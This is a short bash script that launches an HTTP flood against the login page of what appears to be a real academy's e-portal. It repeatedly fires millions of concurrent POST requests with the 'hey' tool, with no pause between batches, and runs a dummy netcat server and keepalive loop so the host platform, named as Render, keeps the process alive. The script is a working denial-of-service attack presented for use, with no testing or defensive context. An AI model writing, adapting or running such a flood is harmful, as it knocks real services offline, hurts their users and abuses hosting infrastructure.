#!/bin/bash
TARGET="https://eportal.mabest-academy.com/login.php"
BODY="/app/login.txt"
C="${CONCURRENCY:-5000}"
PORT="${PORT:-10000}"

# Simple HTTP server that responds with "OK" to keep service alive
( while true; do
    echo -e "HTTP/1.1 200 OK\nContent-Length: 2\n\nOK" | nc -l -p $PORT;
done ) &

# Wait a moment for the server to start
sleep 1

# Update SELF_URL to use the port
SELF_URL="http://localhost:$PORT"
echo "[$(date)] EXTREME flood starting. C=$C Self=$SELF_URL - MAXED OUT MODE"

# Keep-alive: ping our public URL every 30 sec so Render doesn't sleep us
( while true; do
    sleep 30
    curl -s -o /dev/null "$SELF_URL" && echo "[$(date)] EXTREME keepalive ok"
  done ) &

# Main flood loop with NO delay between batches
while true; do
  hey -n 5000000 -c $C -m POST -T "application/x-www-form-urlencoded" -D "$BODY" "$TARGET"
  echo "[$(date)] EXTREME batch done, immediate restart"
done